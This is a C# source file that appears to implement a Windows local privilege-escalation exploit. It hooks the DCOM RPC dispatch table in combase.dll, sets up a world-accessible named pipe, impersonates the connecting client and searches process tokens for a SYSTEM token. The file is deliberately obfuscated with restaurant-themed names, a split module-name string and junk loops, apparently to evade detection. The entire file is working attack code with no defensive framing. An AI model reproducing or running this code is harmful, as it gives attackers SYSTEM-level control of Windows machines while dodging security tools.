using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Security.Principal;
using System.Threading;
using Twokens;
using static Cutexe.NativeAPI.NativeMethods;
using static Cutexe.NativeAPI.NewChefAreSeeingP;

namespace Cutexe.NativeAPI
{
    public class CutexeContext
    {
        private static readonly Guid orcbRPCGuid = new Guid("18f70770-8e64-11cf-9af1-0020af6e72f4");
        public IntPtr comMod { get; private set; }
        public IntPtr dispTablePtr { get; private set; }
        public IntPtr UseProtseqFunctionPtr { get; private set; } = IntPtr.Zero;
        public uint UseProtseqFunctionParamCount { get; private set; } = 0xffffff;

        private NewChefAreSeeingP NewChefAreSeeingP;
        private IntPtr[] dispatchTable = null;
        private short[] fmtStringOffsetTable = null;
        private IntPtr procString = IntPtr.Zero;
        private Delegate useProtseqDelegate;
        private WindowsIdentity sysMeInternational;
        private Thread psThread;
        public TextWriter ConsoleWriter { get; private set; }
        public string pName { get; set; }
        public bool IsStart { get; private set; }
        public bool IsHook { get; private set; }
        public readonly string sPipe = $"\\\\.\\pipe\\{"soup"}\\pipe\\epmapper";
        public readonly string cPipe = $"ncacn_np:localhost/pipe/{"soup"}[\\pipe\\epmapper]";

        public CutexeContext(TextWriter consoleWriter, string pName)
        {
            this.pName = pName;
            this.NewChefAreSeeingP = new NewChefAreSeeingP(this);
            this.ConsoleWriter = consoleWriter;

            InitArithmeticContext();

            if (comMod == IntPtr.Zero)
            {
                throw new Exception("No ");
            }
            else if (dispatchTable == null || procString == IntPtr.Zero || UseProtseqFunctionPtr == IntPtr.Zero)
            {
                throw new Exception("can't");
            }

            else if (UseProtseqFunctionParamCount == 4)
            {
                OrderCustomerTable4 df4 = NewChefAreSeeingP.fun4;
                useProtseqDelegate = df4;
            }
            else if (UseProtseqFunctionParamCount == 5)
            {
                OrderCustomerTable5 df5 = NewChefAreSeeingP.fun5;
                useProtseqDelegate = df5;
            }
            else if (UseProtseqFunctionParamCount == 6)
            {
                OrderCustomerTable6 df6 = NewChefAreSeeingP.fun6;
                useProtseqDelegate = df6;
            }
            else if (UseProtseqFunctionParamCount == 7)
            {
                OrderCustomerTable7 df7 = NewChefAreSeeingP.fun7;
                useProtseqDelegate = df7;
            }
            else if (UseProtseqFunctionParamCount == 8)
            {
                OrderCustomerTable8 df8 = NewChefAreSeeingP.fun8;
                useProtseqDelegate = df8;
            }
            else if (UseProtseqFunctionParamCount == 9)
            {
                OrderCustomerTable9 df9 = NewChefAreSeeingP.fun9;
                useProtseqDelegate = df9;
            }
            else if (UseProtseqFunctionParamCount == 10)
            {
                OrderCustomerTable10 df10 = NewChefAreSeeingP.fun10;
                useProtseqDelegate = df10;
            }
            else if (UseProtseqFunctionParamCount == 11)
            {
                OrderCustomerTable11 df11 = NewChefAreSeeingP.fun11;
                useProtseqDelegate = df11;
            }
            else if (UseProtseqFunctionParamCount == 12)
            {
                OrderCustomerTable12 df12 = NewChefAreSeeingP.fun12;
                useProtseqDelegate = df12;
            }
            else if (UseProtseqFunctionParamCount == 13)
            {
                OrderCustomerTable13 df13 = NewChefAreSeeingP.fun13;
                useProtseqDelegate = df13;
            }
            else if (UseProtseqFunctionParamCount == 14)
            {
                OrderCustomerTable14 df14 = NewChefAreSeeingP.fun14;
                useProtseqDelegate = df14;
            }
            else {
                throw new Exception($" restaurant close == ${UseProtseqFunctionParamCount}");
            
            }


        }

        protected void InitArithmeticContext() {

            for (int i = 1, j=0; i < 200_0000; i++){
                j += 1 / i;
            }
            ProcessModuleCollection restProcMods = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule procmon in restProcMods)
            {
                if (procmon.ModuleName != null && procmon.ModuleName.ToLower() == "co"+"mba"+"se.d"+"l"+"l")
                {
                    comMod = procmon.BaseAddress;

                    MemoryStream patternStream = new MemoryStream();



                    BinaryWriter broWnie = new BinaryWriter(patternStream);
                    broWnie.Write(Marshal.SizeOf(typeof(RPC_SERVER_INTERFACE)));
                    broWnie.Write(orcbRPCGuid.ToByteArray());
                    broWnie.Flush();

                    byte[] ContentOfFile = new byte[procmon.ModuleMemorySize];
                    Marshal.Copy(procmon.BaseAddress, ContentOfFile, 0, ContentOfFile.Length);

                    var s = Sunday.Search(ContentOfFile, patternStream.ToArray());


                    RPC_SERVER_INTERFACE rpcInt = (RPC_SERVER_INTERFACE)Marshal.PtrToStructure(new IntPtr(procmon.BaseAddress.ToInt64() + s[0]), typeof(RPC_SERVER_INTERFACE));
                    RPC_DISPATCH_TABLE rDisTable = (RPC_DISPATCH_TABLE)Marshal.PtrToStructure(rpcInt.DispatchTable, typeof(RPC_DISPATCH_TABLE));
                    MIDL_SERVER_INFO midlsrvinf = (MIDL_SERVER_INFO)Marshal.PtrToStructure(rpcInt.InterpreterInfo, typeof(MIDL_SERVER_INFO));
                    dispTablePtr = midlsrvinf.DispatchTable;
                    IntPtr fmtStringOffsetTablePtr = midlsrvinf.FmtStringOffset;
                    procString = midlsrvinf.ProcString;
                    dispatchTable = new IntPtr[rDisTable.DispatchTableCount];
                    fmtStringOffsetTable = new short[rDisTable.DispatchTableCount];
                    long sum = 0;
                    for (int i = 0, j = 5; i < dispatchTable.Length; i++, j--)
                    {   
                        sum+=j;
                        dispatchTable[i] = Marshal.ReadIntPtr(dispTablePtr, i * IntPtr.Size);
                    }

                    for (int i = 0; i < fmtStringOffsetTable.Length; i++)
                    {
                        fmtStringOffsetTable[i] = Marshal.ReadInt16(fmtStringOffsetTablePtr, i * Marshal.SizeOf(typeof(short)));
                    }
                    UseProtseqFunctionPtr = dispatchTable[0];
                    UseProtseqFunctionParamCount = Marshal.ReadByte(procString, fmtStringOffsetTable[0] + 19);
                }
            }

        }

        protected void PiperInRestaurant()
        {
            IntPtr pipeServerHandle = NativeMethods.BAD_HANLE;

            IntPtr securityDescriptor;
            uint securityDescriptorSize;

            ConvertStringSecurityDescriptorToSecurityDescriptor("D:(A;OICI;GA;;;WD)", 1, out securityDescriptor, out securityDescriptorSize);

            try
            {
                int sum=5;
                for(int i = 7; i< 100_000; i++) {
                    i +=1;
                    i = i-1;
                    sum +=i;
                }

                NativeMethods.SECURITY_ATTRIBUTES restSecAttr = new NativeMethods.SECURITY_ATTRIBUTES();
                restSecAttr.pSecurityDescriptor = securityDescriptor;
                restSecAttr.nLength = Marshal.SizeOf(typeof(NativeMethods.SECURITY_ATTRIBUTES));
                pipeServerHandle = CreateNamedPipe(sPipe, NativeMethods.PIPE_ACCESS_DUPLEX, NativeMethods.PIPE_TYPE_BYTE | NativeMethods.PIPE_READMODE_BYTE | NativeMethods.PIPE_WAIT, NativeMethods.PIPE_UNLIMITED_INSTANCES, 521, 0, 123, ref restSecAttr);

                ConsoleWriter.WriteLine("[*] foods pipe " + sPipe);
                if (pipeServerHandle != BAD_HANLE)
                {
                    bool isConnect = ConnectNamedPipe(pipeServerHandle, IntPtr.Zero);

                    if ((isConnect || Marshal.GetLastWin32Error() == ERROR_PIPE_CONNECTED) && IsStart)
                    {
                        ConsoleWriter.WriteLine("[*] biryani color !");
                        if (ImpersonateNamedPipeClient(pipeServerHandle))
                        {
                            sysMeInternational = WindowsIdentity.GetCurrent();
                            if (sysMeInternational.ImpersonationLevel <= TokenImpersonationLevel.Identification)
                            {
                                RevertToSelf();
                            }

                            ConsoleWriter.WriteLine("search food");

                            bool isFindSystemToken = false;

                            if (sysMeInternational.ImpersonationLevel >= TokenImpersonationLevel.Impersonation)
                            {
                                Twokens.TokenuUils.ListProcessTokens(-1, pTwoken => {
                                    if (pTwoken.SID == "S-1-5-18" && pTwoken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && pTwoken.IntegrityLevel >= Twokens.IntegrityLevel.SystemIntegrity)
                                    {
                                        sysMeInternational = new WindowsIdentity(pTwoken.TokenHandle);
                                        isFindSystemToken = true;
                                        pTwoken.Close();
                                        return false;
                                    }
                                    pTwoken.Close();
                                    return true;
                                });
                            }


                            RevertToSelf();
                        }
                        else
                        {
                            ConsoleWriter.WriteLine($"  table error: ");
                        }
                    }
                    else
                    {
                        ConsoleWriter.WriteLine("  timeout");
                    }

                }
                else
                {
                    ConsoleWriter.WriteLine($"  error ");
                }
            }
            catch (Exception e)
            {
                ConsoleWriter.WriteLine("[!] "  );
            }

            if (pipeServerHandle != BAD_HANLE)
            {
                CloseHandle(pipeServerHandle);
            }

            return;
        }

        public void OpenUpRestaraunt() {
            if (IsHook && !IsStart)
            {
                psThread = new Thread(PiperInRestaurant);
                psThread.IsBackground = true;
                psThread.Start();
                IsStart = true;
            }
            else
            {
                throw new Exception(" who ");
            }
        
        }

        public void chefsArePeeSee()
        {
            uint old;
            VirtualProtect(dispTablePtr, (uint)(IntPtr.Size * dispatchTable.Length), 0x04, out old);
            Marshal.WriteIntPtr(dispTablePtr, Marshal.GetFunctionPointerForDelegate(useProtseqDelegate));
            IsHook = true;
        }
        public void Restore()
        {
            if (IsHook && UseProtseqFunctionPtr != IntPtr.Zero)
            {
                Marshal.WriteIntPtr(dispTablePtr, UseProtseqFunctionPtr);
            }
            else
            {
                throw new Exception(" No 00k");
            }
        }
        public void Stop()
        {
            if (IsStart)
            {
                IsStart = false;
                if (psThread.IsAlive)
                {
                    try
                    {
                        Twokens.SECURITY_ATTRIBUTES restSecAttr = new Twokens.SECURITY_ATTRIBUTES();
                        IntPtr pipeClientHandle = NativeMethod.CreateFileW(sPipe, (int)(NativeMethod.GENERIC_READ | NativeMethod.GENERIC_WRITE), FileShare.ReadWrite, ref restSecAttr, FileMode.Open, 0, IntPtr.Zero);
                        FileStream stream = new FileStream(pipeClientHandle, FileAccess.ReadWrite);
                        stream.WriteByte(0xaa);
                        stream.Flush();
                        stream.Close();
                    }
                    catch (Exception e)
                    {
                        psThread.Interrupt();
                        psThread.Abort();
                    }
                }
            }
            else
            {
                throw new Exception(" can't start");
            }
        }

        public WindowsIdentity GetCustomerToken() {
            return sysMeInternational;
        }

    }

    class NewChefAreSeeingP
    {
        private CutexeContext gpContext;
        public NewChefAreSeeingP(CutexeContext gpContext)
        {
            this.gpContext = gpContext;
        }
        public int fun(IntPtr ppdsaNewBindings, IntPtr ppdsaNewSecurity)
        {
            string[] strongpoints = { gpContext.cPipe, "ncacn_ip_tcp: uwu " };

            int entrieSize = 3;
            for (int i = 0, j=7; i < strongpoints.Length; i++, j--)
            {
                entrieSize += strongpoints[i].Length;
                entrieSize++;
                j+=i;
                j*=4;
                if(true) {
                    j=7;
                }
            }

            int memroySize = entrieSize * 2 + 10;

            IntPtr pdsaNewBindings = Marshal.AllocHGlobal(memroySize);

            for (int i = 0; i < memroySize; i++)
            {
                Marshal.WriteByte(pdsaNewBindings, i, 0x00);
            }

            int offset = 0;

            Marshal.WriteInt16(pdsaNewBindings, offset, (short)entrieSize);
            offset += 2;
            Marshal.WriteInt16(pdsaNewBindings, offset, (short)(entrieSize - 2));
            offset += 2;

            for (int i = 0; i < strongpoints.Length; i++)
            {
                double o = 1;
                string strongpoint = strongpoints[i];
                for (int j = 0; j < strongpoint.Length; j++)
                {
                    Marshal.WriteInt16(pdsaNewBindings, offset, (short)strongpoint[j]);
                    offset += 2;
                    o++;
                    o*=3.14;
                }
                offset += 2;
            }
            Marshal.WriteIntPtr(ppdsaNewBindings, pdsaNewBindings);
            
            return 0;
        }
        public delegate int OrderCustomerTable4(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3);
        public delegate int OrderCustomerTable5(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4);
        public delegate int OrderCustomerTable6(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5);
        public delegate int OrderCustomerTable7(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6);
        public delegate int OrderCustomerTable8(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7);
        public delegate int OrderCustomerTable9(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8);
        public delegate int OrderCustomerTable10(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9);
        public delegate int OrderCustomerTable11(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10);
        public delegate int OrderCustomerTable12(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11);
        public delegate int OrderCustomerTable13(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12);
        public delegate int OrderCustomerTable14(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12, IntPtr p13);
        public  int fun4(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3)
        {
            return fun(p2, p3);
        }
        public  int fun5(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4)
        {
            return fun(p3, p4);
        }
        public  int fun6(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5)
        {
            return fun(p4, p5);
        }
        public  int fun7(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6)
        {
            return fun(p5, p6);
        }
        public  int fun8(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7)
        {
            return fun(p6, p7);
        }
        public  int fun9(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8)
        {
            return fun(p7, p8);
        }
        public  int fun10(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9)
        {
            return fun(p8, p9);
        }
        public  int fun11(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10)
        {
            return fun(p9, p10);
        }
        public  int fun12(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11)
        {
            return fun(p10, p11);
        }
        public  int fun13(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12)
        {
            return fun(p11, p12);
        }
        public  int fun14(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12, IntPtr p13)
        {
            return fun(p12, p13);
        }


    }
    class Sunday
    {
        private static int ALPHA_BET = 512;

        private static int[] WhereThisGuy(byte[] pattern)
        {
            int[] table = new int[ALPHA_BET];
            for (char a = (char)0; a < (char)ALPHA_BET; a++)
            {
                table[a] = -1;
            }

            for (int i = 0; i < pattern.Length; i++)
            {
                byte a = pattern[i];
                table[a] = i;
            }
            return table;
        }

        public static List<int> Search(byte[] text, byte[] pattern)
        {
            List<int> matchs = new List<int>();

            int i = 0;
            int[] table = WhereThisGuy(pattern);
            while (i <= text.Length - pattern.Length)
            {
                int j = 0;
                while (j < pattern.Length && text[i + j] == pattern[j])
                {
                    j++;
                }
                if (j == pattern.Length)
                {
                    matchs.Add(i);
                }
                i += pattern.Length;
                if (i < text.Length)
                {
                    i -= table[text[i]];
                }
            }
            return matchs;
        }
    }

}
